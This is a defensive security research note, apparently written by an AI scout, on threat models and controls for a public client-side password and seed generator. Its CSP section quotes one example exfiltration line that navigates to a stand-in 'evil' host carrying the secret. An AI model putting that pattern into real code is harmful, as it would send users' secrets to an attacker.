---
id: rq3-client-side-security
created: 2026-11-04
type: research-note
status: active
parent: research-public-password-generator
question: "What can go wrong when a public website generates secrets in the browser, and how do we defend against it?"
tags: [security, supply-chain, csp, csprng, pwa]
---

# RQ3 — Security of a public client-side secret generator

## Context

- The site is public and stateless; the server serves static files only.
- It generates Wi-Fi passwords (and possibly a seed/recovery code) in the browser.
- The main asset is the **seed** (if seeded mode) and the **generated list** (if random mode).
- A public tool that generates secrets is a high-value target for code tampering: malicious
  JS can exfiltrate seeds or bias output.

## Sub-questions

1. **Threat model:** who are the attackers — casual visitor, someone who knows the cousin,
   a compromised static host, a malicious dependency, a network attacker, a browser
   extension, a shoulder surfer, a lost device? What is in and out of scope?
2. **Supply chain:** third-party JS, CDN dependencies, build pipeline, package registry,
   maintainer compromise. How to minimize: bundle everything, pin versions, lockfiles,
   dependency review, no third-party scripts, SRI where applicable.
3. **Hosting integrity:** static host compromise, DNS hijack, TLS, preview/deployment URLs,
   stale deployments. How to detect and mitigate: reproducible builds, signed releases,
   open source, multiple mirrors, offline PWA, hash verification.
4. **CSPRNG:** `crypto.getRandomValues` vs `Math.random`; rejection sampling for 8 digits;
   WebCrypto secure-context requirements; fallbacks and failure behavior.
5. **Seed handling:** keep the seed in memory only; do not put it in the URL query, logs,
   analytics, localStorage by default, or a service-worker cache. What are the exceptions
   (explicit "remember on this device"), and how to make them safe?
6. **XSS and DOM safety:** no user-generated HTML, strict CSP, no `innerHTML` with user
   input, no third-party widgets, safe clipboard handling.
7. **Verification:** how can a user verify the code they are running? Downloadable
   single-file HTML, reproducible build, published hash, source repository, offline mode.
8. **Browser support:** iOS Safari, WebCrypto, PWA/service workers, clipboard API, print,
   file download. What degrades gracefully?
9. **Operational security:** what should the host not log? What should the privacy policy
   say? How to avoid analytics and error tracking capturing secrets?
10. **Recommendation:** a threat model, a minimal architecture, and a checklist of controls.

## Scout brief

Prioritize questions 2, 3, 5, 6, and 7. Fetch official docs for CSP, SRI, WebCrypto, and
service workers. Be explicit about the residual risk that a compromised or malicious host
can serve backdoored JS; client-side crypto does not protect against that. Recommend
verification mechanisms that are realistic for a non-technical user.

## Findings (scout output)

### Summary

A stateless, client-side generator has a **small but unforgiving** attack surface. There is no
server to breach, no database to leak, and no session to hijack — but the entire product *is*
the JavaScript that runs in the user's browser. Whoever controls that bytes stream controls every
secret the tool produces. The security model therefore reduces to three questions:

1. **Is the code the user is running the code we published?** (supply chain + hosting integrity)
2. **Is the randomness actually random?** (CSPRNG + unbiased sampling)
3. **Does the secret stay on the user's machine?** (DOM hygiene, storage, logging, network)

Everything else (CSP, SRI, Trusted Types) is defense-in-depth that limits blast radius *after*
one of those three fails. The single most important sentence in this note:

> **Client-side crypto cannot protect against a compromised host.** If an attacker can serve
> different JavaScript, they can exfiltrate the seed before it is ever used. No amount of
> in-browser cryptography fixes that; only independent verification of the artifact does.

**Confidence:** high on mechanics (RNG, CSP, SRI, service workers — primary docs).
Medium on product-level recommendations, which depend on unresolved requirements
(see Open questions), notably whether an 8-digit numeric password is a hard router constraint.

---

### Threat model

Assets, in order of value:

| Asset | Why it matters | Where it lives |
|---|---|---|
| **Seed / recovery code** | Regenerates *every* password for a site. Single point of total compromise. | JS memory (ideally only) |
| **Generated password list** | Direct Wi-Fi access; often reused/printed. | JS memory, DOM, clipboard, paper |
| **SSID + metadata** | Location inference, targeting. | DOM, printout |
| **User IP / UA** | Unavoidable at the transport layer; correlation risk. | Host access logs |

Trust boundaries: **repo → CI → artifact → static host → DNS/TLS → browser → OS/device → human**.
Each arrow is an opportunity to substitute code or observe a secret.

| # | Actor | Capability | In scope? | Impact | Primary controls | Residual |
|---|---|---|---|---|---|---|
| T1 | **Casual visitor** | Uses the tool; sees own secrets only | Yes (as beneficiary) | None unless they leak their own output | Clear UX, masked reveal, no persistence | User copies to insecure places |
| T2 | **Someone who knows the cousin** | Shoulder surfing, later physical access to device, social engineering, guessing | Partly | High (targeted) | High-entropy defaults, no persistence, masked display, short reveal timer, print warnings | Out of scope once they have the device unlocked |
| T3 | **Compromised static host** | Serve arbitrary HTML/JS to all users; alter headers | **Yes — highest impact** | Total: all secrets harvested | Reproducible build, published hash, signed releases, mirrors, offline copy, external monitoring | **Cannot be fully mitigated**; see Residual risks |
| T4 | **Malicious dependency / build pipeline** | Code execution in the artifact; exfiltration; biased RNG | **Yes** | Total | Zero runtime deps, lockfile + `npm ci`, no install scripts, review, SBOM, provenance | Maintainer/CI compromise still possible |
| T5 | **Network attacker** | MITM on HTTP/captive portal, DNS spoof, injected HTML | Yes | Total (injected JS) | HTTPS-only, HSTS preload, no mixed content, refuse to run when `!isSecureContext` | Compromised CA (CT monitoring helps detect) |
| T6 | **Browser extension** | Read/modify DOM, inputs, clipboard, network on any page | **Out of scope** (cannot defend) | Total for that user | Warn; suggest private window w/o extensions or offline file | Unfixable from the page |
| T7 | **Shoulder surfer** | Observe screen/paper | Partly | High | Masked by default, tap-to-reveal, auto-hide, no auto-print | Physical world |
| T8 | **Lost/stolen device** | Read history, downloads, clipboard, screenshots, localStorage | Partly | High | No persistence by default, `Cache-Control: no-store`, guidance to use private window | OS-level access defeats anything client-side |
| T9 | **Malicious/curious third party embedded in page** (analytics, fonts, QR API, CDN) | Receive secrets or metadata | Yes | High | **No third-party requests at all**; self-hosted everything; `connect-src 'none'` | Misconfiguration |
| T10 | **Typo-squatter / malicious mirror / stale deploy** | Serve an old or lookalike version | Yes | High | Signed releases, canonical domain, version display, deploy verification | User can't always tell |
| T11 | **Malicious insider / compromised maintainer account** | Publish a backdoored release | Yes | Total | 2FA, branch protection, required review, signed tags, reproducible builds, transparency | Social engineering |

Explicit non-goals: defending against a rooted/compromised OS, a keylogger, a malicious browser,
a hostile extension, or a user who deliberately publishes their seed. Say so in the docs rather
than implying the tool is "unhackable".

---

### 1. CSPRNG

**Use `crypto.getRandomValues()`; never `Math.random()`.**

- `Math.random()` is a fast PRNG (V8 uses xorshift128+), *not* cryptographic. Internal state is
  recoverable from a modest number of outputs; output is predictable. It has no place anywhere in
  the generation path — not for salts, not for "just the default length", not for IDs.
- `crypto.getRandomValues()` fills an integer TypedArray in place from the UA's CSPRNG, seeded from
  the platform entropy source. It is the **only `Crypto` member usable from an insecure context**,
  and it throws `QuotaExceededError` above 65,536 bytes per call. (See MDN.)
- **Availability ≠ safety.** Because `getRandomValues` works over plain HTTP, an HTTP page can look
  perfectly functional while being injected in transit. Check `window.isSecureContext` and refuse
  to generate on non-secure origins (allow `file://`, which browsers treat as potentially
  trustworthy).
- **Fail closed.** If `crypto.getRandomValues` is missing, show an error and generate nothing.
  Never fall back to `Math.random()`, `Date.now()`, mouse movement, or "a hash of the time".
- `crypto.subtle` (HKDF, SHA-256, PBKDF2) requires a **secure context**. `file://` is normally
  treated as secure, but availability varies by browser — verify on the target matrix (notably
  iOS Safari) before depending on `subtle` for seed derivation.

**Uniform 8-digit sampling (rejection sampling).** `2^32 = 4,294,967,296` is not a multiple of
`10^8`, so `value % 100_000_000` over-weights the low `96,729,696` values by ~2.4% relative
(≈0.04 bits of min-entropy). Cheap fix:

```js
const LIMIT = 4_200_000_000; // 42 × 10^8, largest multiple of 10^8 ≤ 2^32
const buf = new Uint32Array(1);
let n;
do { crypto.getRandomValues(buf); n = buf[0]; } while (n >= LIMIT); // ~97.8% acceptance
const code = String(n).padStart(8, "0");
```

Per-digit alternative: draw bytes, reject `>= 250`, then `% 10` (acceptance 97.66%/byte, exactly
uniform, no cross-digit correlation). Either is fine; the modulo shortcut is not.

**Entropy reality check.** 8 decimal digits = `10^8` ≈ **26.6 bits**. Against an offline WPA2
handshake attack at 10^9 guesses/s that is ~100 seconds. If the router permits it, default to
**≥ 16 characters** from a 32+ symbol alphabet (≥ 80 bits) or 5–6 diceware words. If 8 digits is a
firm hardware requirement, keep it, but do not describe the result as "strong" — describe it as
"the most the router accepts" and recommend WPA3/SAE where available.

For a seed: **≥ 128 bits** from `getRandomValues(new Uint8Array(16))`, encoded as 32 hex or 26
base32 characters with a checksum. Derive per-device passwords with HKDF-SHA-256 over
`seed || ssid || index` so the seed is used once and never re-exposed.

---

### 2. Supply chain

The cheapest reliable control is **having no supply chain**: a single HTML file with inline CSS and
JS, zero runtime dependencies, zero network requests. If a framework is used, it is a *build-time*
dependency only — it must be compiled into the artifact, never loaded from a CDN at runtime.

Controls, in priority order:

1. **Zero third-party runtime scripts.** No CDN, no Google Fonts, no analytics, no tag manager, no
   embedded widgets, no remote QR-generation API (a QR API receives the Wi-Fi password in a query
   string — a textbook leak). Self-host fonts as subset WOFF2 or use system font stacks.
2. **Zero (or minimal, pinned) runtime dependencies.** Prefer the platform: `getRandomValues`,
   `subtle.digest`, `URL.createObjectURL`, `navigator.clipboard`. Every dependency is a maintainer
   you now trust.
3. **Lockfile + `npm ci`** (not `npm install`), committed lockfile, `--ignore-scripts` /
   `ignore-scripts=true` in `.npmrc` to neutralise `postinstall` worms. Pin the Node version and
   the package-manager version.
4. **Dependency review:** Dependabot/Renovate for updates, `npm audit`/OSV-Scanner in CI, Socket or
   similar for install-time behaviour, and a human diff review of every bump. Record an SBOM.
5. **Build provenance:** CI-only builds from a protected branch, OIDC short-lived credentials, no
   long-lived registry tokens on laptops, npm provenance / SLSA attestation, signed git tags.
6. **SRI** (`integrity="sha384-…"` + `crossorigin="anonymous"`): correct for *cross-origin*
   subresources, requires CORS, and is ignored in `no-cors` mode. **It is not a defence against
   first-party host compromise** — an attacker who can rewrite the `<script>` tag can rewrite the
   hash beside it. With a fully bundled first-party artifact, SRI adds little; the equivalent
   control is a **CSP hash** of the inline script (which is what makes the artifact self-verifying
   *if* the HTML is authentic). `Integrity-Policy: blocked-destinations=(script)` is a newer,
   stricter option worth adopting where supported.
7. **Reproducible output:** deterministic build, no timestamps/absolute paths/random IDs in the
   bundle, `SOURCE_DATE_EPOCH` set, two independent builders producing byte-identical files.

---

### 3. Hosting integrity

Assume the host *will* eventually be compromised or misconfigured; design so that the compromise
is detectable and survivable.

- **TLS:** HTTPS everywhere, HTTP→HTTPS 301, `Strict-Transport-Security: max-age=63072000;
  includeSubDomains; preload`, no mixed content, modern ciphers. TLS protects transport only; it
  says nothing about whether the origin is honest.
- **DNS:** registrar lock + registry lock, 2FA on the registrar, DNSSEC, `CAA` record pinning the
  CA, and **Certificate Transparency monitoring** (crt.sh / Cert Spotter alerts) for unexpected
  certificates on your domain and lookalikes.
- **Host account:** hardware-key 2FA, least-privilege deploy tokens scoped to one site, deploy only
  from CI, required reviews, branch protection, audit-log export.
- **Preview/deployment URLs:** the classic hole. Platform preview builds on `*.netlify.app` /
  `*.vercel.app` are often public, indexable, and outside your CSP/HSTS assumptions. Either disable
  them for the production repo, put them behind auth, or at minimum send `X-Robots-Tag: noindex`
  and never link them. Avoid wildcard DNS pointed at a host you don't control (subdomain takeover).
- **Stale deployments:** content-hashed immutable asset filenames, `Cache-Control: no-cache` (or
  `no-store`) on HTML, a visible **version + build hash** in the footer, and a post-deploy smoke
  test that fetches the live file, hashes it, and compares to the release manifest. Alert on drift.
- **Service worker is a persistence layer for attackers.** Once a malicious SW is installed it can
  serve tampered content on later visits even after the host is cleaned, until it updates or is
  unregistered. Serve the SW with a short `max-age`, register with `updateViaCache: "none"`, and
  ship a visible "reset / unregister & clear cache" action.
- **Mirrors:** independent copies (GitHub Releases, Codeberg, an IPFS CID, a plain file on a
  second domain) reduce single-host risk — but only if the artifact is **signed or hash-published**,
  otherwise mirrors just multiply the number of things the user must trust. Publish the canonical
  SHA-256 in the repo, in release notes, and in the UI.
- **Reproducible builds** are the mechanism that turns "trust the host" into "verify the host":
  anyone can rebuild from source and compare. This is the only control that survives a fully
  malicious origin.

---

### 4. Seed handling

Default: **memory only, for the lifetime of the tab.**

Rules:

- Never in the **URL query** (`?seed=…` is sent to the server and written to access logs, proxy
  logs, and `Referer`). Never in the **fragment** either — fragments avoid the server but still land
  in history, screenshots, sync, and shared links. Keep secrets out of URLs entirely; URLs are for
  *settings* (`?len=20&words=5`), never secrets.
- Never in `console.*`, `alert()`, `document.title`, `window.name`, custom events, or `postMessage`
  to other origins.
- Never in **analytics, session replay, or error tracking** (Sentry breadcrumbs capture DOM and
  console; Hotjar/FullStory capture input values). Simplest fix: ship none of them.
- Never in `localStorage`/`sessionStorage` **by default**. `sessionStorage` is marginally better
  (tab-scoped) but still readable by any XSS or extension and survives back/forward restore.
- Never in a **service-worker cache** or the HTTP cache: secrets must not be in any response body.
  `Cache-Control: no-store` on the document; a "Clear data" action can send
  `Clear-Site-Data: "cache", "storage"`.
- Keep the seed in a `Uint8Array` rather than a JS string where possible; overwrite it on "clear"
  (strings are immutable and cannot be reliably wiped — accept this and minimise lifetime).
- Don't put the seed in a form field with a `name` (password managers and extensions may capture
  it); render it as text and offer an explicit copy button. `autocomplete="off"`,
  `spellcheck="false"`, `autocapitalize="off"`, `readonly` until focused.
- If it must be shown, mask by default with a deliberate "reveal" and an auto-hide timer.

**Safe exception — explicit "remember on this device":**

- Opt-in, off by default, with a plain-language warning ("anyone with this device, or any extension
  with access to this page, can read this").
- Encrypt the seed with a **user passphrase** via PBKDF2-SHA-256 (≥ 600k iterations; Argon2id is
  better but needs WASM) or a platform passkey/WebAuthn-derived key, store ciphertext in IndexedDB.
  Note honestly that this protects against *offline device theft*, not against XSS or a hostile
  extension while the page is open.
- Prefer storing the **derived password list** over the master seed when that is sufficient — a
  leak is then scoped to one site instead of everything the seed can generate.
- Always provide a one-click "forget this device" that deletes the record and clears caches.

---

### 5. XSS / DOM safety

The app has no server-side rendering and (ideally) no user-generated HTML, so classic XSS is
unlikely — but user-controlled strings (SSID, label, seed) still flow into the DOM, into QR
payloads, into filenames, and into clipboard text.

- **No `innerHTML` with any variable.** Use `textContent`, `value`, `insertAdjacentText`,
  `setAttribute` with fixed names. `document.createElement(name)` is not a text sink.
- **Strict CSP**, header-first with a `<meta http-equiv>` fallback (meta cannot do
  `frame-ancestors`, `sandbox`, or `report-to`):

  ```
  Content-Security-Policy:
    default-src 'none';
    script-src 'sha256-<hash of the single inline script>' 'strict-dynamic';
    style-src 'sha256-<hash>';
    img-src 'self' data:;
    font-src 'self';
    connect-src 'none';
    form-action 'none';
    base-uri 'none';
    frame-ancestors 'none';
    object-src 'none';
    require-trusted-types-for 'script';
  ```

  A **hash-based** policy is the right fit for a static single-file app (nonces require per-response
  templating). `connect-src 'none'` is the highest-value directive here: it blocks `fetch`, XHR,
  `sendBeacon`, and WebSocket exfiltration even if injected code runs. It cannot block
  `location = "https://evil/?s=…"` (no widely supported `navigate-to`), which is why the artifact
  must also be authentic.
- `require-trusted-types-for 'script'` + a named policy prevents accidental string-to-HTML sinks in
  Chromium; it degrades to nothing elsewhere, so it is a bonus, not the plan.
- **QR payload injection:** the WPA QR format is `WIFI:T:WPA;S:<ssid>;P:<password>;;` — `\ ; , : "`
  must be backslash-escaped. An SSID containing `;` can otherwise alter the payload. Generate QR
  **locally** (bundled library); never call a QR web service.
- **CSV/print injection:** prefix cells starting with `= + - @ TAB CR` with `'` to avoid spreadsheet
  formula injection; sanitise download filenames to `[a-z0-9._-]`, cap length, strip leading dots.
- **Clipboard:** `navigator.clipboard.writeText` needs a secure context and transient user
  activation; provide a `document.execCommand("copy")` fallback behind a hidden textarea. Copy only
  on explicit click (never automatically), show a confirmation, and offer a best-effort
  "clear clipboard in 60 s" (can't verify contents without permission). Warn that clipboard is
  readable by other apps/extensions and, on Apple devices, may sync via Universal Clipboard.
- Avoid `eval`, `new Function`, `setTimeout(string)`, `javascript:` URLs, and inline event handlers.
- `Referrer-Policy: no-referrer`, `X-Content-Type-Options: nosniff`,
  `Cross-Origin-Opener-Policy: same-origin`, `Cross-Origin-Resource-Policy: same-origin`,
  `Permissions-Policy: camera=(), microphone=(), geolocation=(), usb=()`.

---

### 6. Verification (realistic for a non-technical user)

There is no way to make hash comparison pleasant for a non-expert. Design a **ladder** so the
default path requires no verification at all, and the strong path is available to the people who
will actually do it.

| Tier | Mechanism | Who can do it | What it proves |
|---|---|---|---|
| 0 | **No-network design + "airplane mode" test**: load page, disable Wi-Fi/cellular, generate. Also show a live count of network requests since load (from `performance.getEntriesByType("resource")`). | Everyone | Nothing left the device *during generation*. Does not prove the page wasn't backdoored at load time, and a script could cache-then-send later — but it defeats the common case and catches accidental third-party calls. |
| 1 | **Downloadable single-file HTML**, "Save a copy" button; open from `file://`. Works with no server. | Everyone | The copy you hold is the copy you run, immune to later host compromise. |
| 2 | **Published SHA-256** of the release file, in the repo, release notes, and a `/verify` page; a one-line command (`sha256sum`) or a small local hash-checker page. | Motivated users, "the cousin's nephew" | Your file matches the published release. Trust shifts to "was the published hash itself authentic?" |
| 3 | **Signed release** (minisign/Sigstore/cosign) + signed git tag; key fingerprint published out-of-band. | Technical users | Authenticity, not just integrity — survives a compromised host. |
| 4 | **Reproducible build**: `npm ci && npm run build` yields the same SHA-256; documented toolchain; two independent rebuilders. | Auditors, journalists, researchers | The artifact really corresponds to the public source. |
| 5 | Independent audit / public bug bounty / transparency log entry. | The ecosystem | Broader assurance. |

Practical extras: a human-comparable short fingerprint (first 8 hex chars, or an emoji sequence
derived from the hash) shown both on the site and in the release notes; a `version.json` that the
page displays; Wayback/archive snapshots flagged as *not* trusted. Be honest in the UI that tiers
0–1 are heuristics and tier 2+ is what actually closes the host-compromise hole.

---

### 7. Browser support / graceful degradation

Baseline target: **Safari iOS 16+, Chrome/Edge 110+, Firefox 110+** (confirm in Open questions).

| Feature | Support notes | Degradation |
|---|---|---|
| `crypto.getRandomValues` | Universal, works in insecure contexts & workers | If absent → **fail closed**, no generation |
| `crypto.subtle` (HKDF/PBKDF2) | Secure context only; `file://` support varies (Safari is restrictive) | Feature-detect; if absent, offer random-only mode instead of seed derivation, or bundle a vetted pure-JS HKDF |
| `crypto.randomUUID` | Secure context, newer | Don't use for anything security-relevant |
| Service worker / PWA | iOS Safari 11.3+; **7-day eviction** of non-installed site data under ITP; `navigator.storage.persist()` is best-effort | App must work fully without SW; SW is an offline optimisation only |
| `navigator.clipboard.writeText` | Secure context + user gesture; iOS requires gesture | `execCommand("copy")` fallback; final fallback = selectable text |
| `<a download>` | Works on desktop; iOS Safari often opens the blob instead of downloading | Offer "open then Share → Save to Files"; `navigator.share` when available |
| `window.print()` | Universal | Print stylesheet; warn that paper is a secret |
| Web Share | Mobile Safari/Chrome | Hide the button when unsupported |
| CSS `:has()`, container queries, `<dialog>` | Recentish | Progressive enhancement only; never required for correctness |

Rules: no polyfills fetched at runtime; feature-detect at the point of use; the **core generation
path must run with JavaScript features from ~2020** and no network. Test the actual matrix:
iOS Safari (clipboard + download + print), Android Chrome, desktop Firefox, `file://`, offline,
and a fresh profile with extensions disabled.

---

### 8. Operational security / logging / privacy

What the host **must not** log:

- Query strings containing secrets (best enforced by never putting secrets in URLs).
- Any request body — there should be none; there is no API.
- `Referer` values containing secrets (`Referrer-Policy: no-referrer` on every response).
- CSP violation reports with `sample` fields (they can contain fragments of script and, in a bad
  implementation, data). If reporting is enabled at all, self-host the endpoint and strip
  `sample`/`script-sample`.
- IP addresses beyond the minimum needed for operations — set the shortest defensible retention,
  or use a host that doesn't retain. Note: IP/UA are unavoidable at the TCP/HTTP layer; say so
  rather than claiming "we log nothing".
- Anything from session replay, heatmaps, A/B testing, or RUM that captures DOM or inputs.

Recommended headers: `Cache-Control: no-store` on HTML, `Referrer-Policy: no-referrer`,
`X-Robots-Tag: noindex` on non-canonical/preview hosts, `Permissions-Policy` denying device APIs.

Privacy policy should state, in plain language and truthfully:

- Generated secrets are created **in the browser** and are never transmitted to us.
- **No accounts, no cookies, no analytics, no advertising, no third-party requests.**
- The only data the host sees is standard server-log data (IP, user agent, requested file, time)
  retained for N days for security/abuse purposes.
- "Remember on this device" is opt-in, encrypted with your passphrase, stored only in your browser,
  and removable with one click.
- What we **cannot** protect against (extensions, compromised device, shoulder surfing) and what to
  do about it.
- Contact / security disclosure address (`security.txt`).

Also: `security.txt`, a documented disclosure policy, and a public changelog with security-relevant
entries. If the site is ever monetised, re-review this section — ads/analytics would invalidate
most of it.

---

### 9. Minimal architecture

```
┌────────────┐   push tag    ┌──────────────────────────┐
│ Public repo│──────────────▶│ CI (pinned toolchain)    │
│ (source,   │               │  npm ci --ignore-scripts │
│  lockfile, │               │  deterministic build     │
│  tests)    │               │  → single index.html     │
└────────────┘               │  → sha256 + minisign/Sigstore
                             └────────────┬─────────────┘
                                          │ immutable release artifact
                                          ▼
                             ┌──────────────────────────┐
                             │ Static host (HTTPS/HSTS) │
                             │ no server code, no API   │
                             │ no preview URLs on prod  │
                             └────────────┬─────────────┘
                                          │ 1 HTML file, 0 subrequests
                                          ▼
┌───────────────────────────────────────────────────────────────────┐
│ Browser                                                           │
│  • refuses to run if !isSecureContext (except file://)            │
│  • CSP: default-src 'none'; connect-src 'none'; hashed script     │
│  • seed in Uint8Array, memory only, wiped on clear                │
│  • getRandomValues + rejection sampling → HKDF → passwords        │
│  • rendering via textContent only; QR generated locally           │
│  • optional: passphrase-encrypted IndexedDB (opt-in only)         │
│  • optional SW: shell cache only, never secrets                   │
└───────────────────────────────────────────────────────────────────┘
```

Deliberate omissions: no backend, no database, no auth, no cookies, no analytics, no CDN, no
external fonts, no remote QR service, no URL-borne secrets, no server-side rendering.

---

### 10. Controls checklist

**P0 — must have before launch**

- [ ] All generation uses `crypto.getRandomValues`; no `Math.random` anywhere (enforce with lint/CI grep).
- [ ] Rejection sampling for digit/character ranges (no modulo bias).
- [ ] Fail closed if CSPRNG missing; refuse non-secure origins.
- [ ] Single self-contained artifact, **zero third-party runtime requests** (verify in DevTools network tab: 1 document, 0 others).
- [ ] Strict CSP with `default-src 'none'`, `connect-src 'none'`, hashed inline script, `base-uri 'none'`, `frame-ancestors 'none'`, `form-action 'none'`.
- [ ] No secret in URL, logs, analytics, localStorage, or SW cache.
- [ ] No `innerHTML` with variables; `textContent` only; Trusted Types where supported.
- [ ] Host: HTTPS + HSTS preload, 2FA, branch protection, CI-only deploys, no public preview URLs.
- [ ] Published SHA-256 + signed tag; downloadable single-file copy; visible version/build hash.
- [ ] Privacy policy accurate; no analytics/error tracking; `security.txt`.

**P1 — strongly recommended**

- [ ] Reproducible build from a pinned toolchain, verified by a second builder in CI.
- [ ] Lockfile committed, `npm ci`, `ignore-scripts=true`, dependency review + SBOM.
- [ ] CT monitoring + CAA + DNSSEC + registrar lock.
- [ ] Post-deploy hash check against the release manifest; alert on drift.
- [ ] Offline PWA shell cache with explicit update prompt and "reset app" (unregister SW, clear caches).
- [ ] Masked reveal by default, auto-hide, print warning, clipboard fallback + auto-clear offer.
- [ ] Threat-model doc and "what this tool cannot protect you against" page.
- [ ] Test matrix executed: iOS Safari, Android Chrome, Firefox, `file://`, offline, no extensions.

**P2 — nice to have**

- [ ] minisign/Sigstore signature + out-of-band fingerprint.
- [ ] Independent mirror(s) with the same signed artifact.
- [ ] `Integrity-Policy` header, `Clear-Site-Data` on reset, COOP/CORP/Permissions-Policy.
- [ ] Short human-comparable fingerprint shown in UI and release notes.
- [ ] External uptime/tamper monitor that hashes the live page hourly.
- [ ] Independent security review / bug bounty.

---

### Residual risks (stated plainly)

1. **A compromised or malicious host can serve backdoored JS.** This is not mitigated by CSP,
   SRI, Trusted Types, or client-side crypto — the attacker controls the HTML that carries the
   policy and the hash. Only an independently verified artifact (tier 2+, ideally reproducible
   builds + signatures) closes this, and only for users who verify. **For everyone else, the
   security of the tool equals the integrity of the domain operator.** Say this in the UI.
2. **A compromised maintainer, CI system, or package** can ship a backdoor *through* a legitimate,
   correctly signed release. Reproducible builds make this detectable after the fact, not
   impossible; review and provenance reduce but do not eliminate it.
3. **Browser extensions (and password managers, accessibility tools, corporate DLP agents)** can
   read and rewrite the page and its inputs. Nothing a website does can prevent this. Users who
   need assurance should use a clean profile or the offline file.
4. **A compromised endpoint** (keylogger, rootkit, malicious browser build, OS-level screen
   capture) defeats every control here. Out of scope.
5. **Persistence is a liability.** Any "remember on device" feature converts a memory-only secret
   into an at-rest secret, protected only by a passphrase and the browser's storage. XSS or an
   extension while unlocked reads it. Keep it opt-in and scoped.
6. **8-digit numeric passwords are weak** (~26.6 bits). If the router forces it, the tool cannot
   fix the router; document the limit and recommend longer/WPA3.
7. **Physical leakage** — shoulder surfing, printed sheets, photos of QR codes, shared PDFs,
   clipboard sync, cloud backups of screenshots — is outside the software's control.
8. **Availability:** a static host outage or DNS failure takes the tool down; the offline copy is
   the only real mitigation, and only for users who downloaded it in advance.
9. **Stale service workers, cached pages, and archived snapshots** can keep serving an old,
   since-patched version. Version display + forced update + short SW `max-age` reduce, not remove.
10. **Repudiation/attribution:** the tool cannot prove a password was generated by it rather than
    typed by a human; don't imply otherwise.

---

### Recommendation

Ship a **single self-contained HTML file with no runtime dependencies and no network requests**,
built reproducibly in CI from a public repo, published with a SHA-256 and a signed tag, and hosted
on a hardened static host. Treat the artifact — not the server — as the security boundary, and give
users a way to step outside the host's trust entirely (download + `file://` + airplane mode).

Concretely:

1. **Zero-dependency artifact.** One HTML file, inline CSS/JS, system fonts, locally generated QR,
   nothing fetched at runtime. This removes entire threat classes (T4, T9) rather than mitigating them.
2. **CSP as a blast-radius limiter**, not a selling point: `default-src 'none'`,
   `connect-src 'none'`, hashed script, `base-uri 'none'`, `frame-ancestors 'none'`.
3. **CSPRNG with rejection sampling**, fail-closed, secure-context check, 8-digit only where the
   hardware demands it — with an honest entropy note.
4. **Memory-only seeds by default.** No URL, no logs, no analytics, no storage. Opt-in encrypted
   "remember" is a separate, clearly-labelled feature.
5. **Verification ladder:** downloadable file → published hash → signed release → reproducible
   build, plus an airplane-mode test and a live network-request counter for non-technical users.
6. **Operational honesty:** a page that says what the tool protects against *and* what it doesn't,
   including the host-compromise caveat, in language a non-technical cousin can follow.

---

### Open questions

1. **Is 8-digit numeric a hard requirement** (router/ISP constraint) or a default? This decides
   whether the headline entropy is ~26 bits or ~80+ bits, and changes the UX copy substantially.
2. **Is the seed actually needed?** If regeneration across devices isn't required, per-device
   `getRandomValues` output is simpler and strictly safer (nothing to recover, nothing to store).
   If it is needed, how is the seed transferred — QR on screen, paper, or (risky) a URL?
3. **Who is "the cousin"?** The threat model for a non-expert sharing a printed sheet is different
   from a technical user; this affects defaults for masking, print, and persistence.
4. **Does the product need to work offline as an installed PWA**, or is a downloaded HTML file
   enough? PWA adds a persistent SW attack surface and iOS storage-eviction caveats.
5. **Browser baseline** — which iOS/Safari minimum? This determines whether `crypto.subtle`,
   `navigator.share`, and Trusted Types can be relied on for seed derivation.
6. **Do we want signed releases** (minisign/Sigstore)? It is the only control that survives host
   compromise for verifying users, but adds key-management and UX burden.
7. **Trust anchor for the domain:** is there budget/commitment for a long-lived domain, HSTS
   preload, CAA, and CT monitoring? A cheap throwaway domain undermines everything else.
8. **Legal/privacy jurisdiction** and log-retention obligations — determines the exact privacy
   policy wording and whether IP retention can be minimised.
9. **Any future monetisation** (ads, analytics, affiliate links)? It would invalidate several P0
   controls; decide now.
10. **Does the tool need to export/print lists**, and if so, what is the accepted leakage model for
    PDFs, printers, and cloud-synced files?

---

### Sources consulted

Fetched (official/primary):

- MDN — *Content Security Policy (CSP)*: https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP
  (redirect target of `/en-US/docs/Web/HTTP/CSP`)
- MDN — *Subresource Integrity*: https://developer.mozilla.org/en-US/docs/Web/Security/Defenses/Subresource_Integrity
  (redirect target of `/en-US/docs/Web/Security/Subresource_Integrity`)
- MDN — *Crypto: getRandomValues()*: https://developer.mozilla.org/en-US/docs/Web/API/Crypto/getRandomValues
- MDN — *Service Worker API*: https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API
- OWASP Cheat Sheet Series — *Content Security Policy*: https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html
- OWASP Cheat Sheet Series — *Cross Site Scripting Prevention*: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- Reproducible Builds: https://reproducible-builds.org

Attempted, unavailable:

- `websearch` for "client-side password generator security compromised static host backdoored
  JavaScript threat model" → **HTTP 402** (search integration unavailable in this environment).

Referenced by the above, not independently fetched (treat as secondary):

- web.dev — *Mitigate cross-site scripting with a strict CSP*: https://web.dev/articles/strict-csp
- *CSP Is Dead, Long Live CSP!* (ACM CCS 2016): https://dl.acm.org/doi/pdf/10.1145/2976749.2978363
- MDN — *Secure Contexts*: https://developer.mozilla.org/en-US/docs/Web/Security/Defenses/Secure_Contexts
- MDN — *Trusted Types API*: https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API
- MDN — *Integrity-Policy* header: https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Integrity-Policy
- W3C — *Web Cryptography Level 2*: https://w3c.github.io/webcrypto/#Crypto-method-getRandomValues
